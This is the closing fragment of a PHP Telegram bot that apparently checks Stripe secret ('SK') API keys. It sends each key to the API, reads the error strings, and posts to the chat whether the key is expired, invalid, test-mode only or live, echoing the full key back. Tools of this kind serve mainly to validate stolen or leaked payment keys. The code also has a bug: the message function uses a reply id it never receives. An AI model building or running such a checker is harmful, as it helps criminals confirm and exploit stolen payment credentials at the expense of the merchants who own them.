sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Expired API key Provided.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Invalid API Key Provided.</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A MESSAGE: <b>You did not provide an API key.</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>Testmode Charges Only.</b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}else{
sendMessage($chatId, "<b>⁕ ─ 𝗦𝗞 𝗞𝗘𝗬 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 ─ ⁕</b>%0A KEY: <code>$sec</code>%0A MESSAGE: <b>SK Key Live.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>LIVE ✅</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@$username</b>%0A", $message_id);
}
}

// Function

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>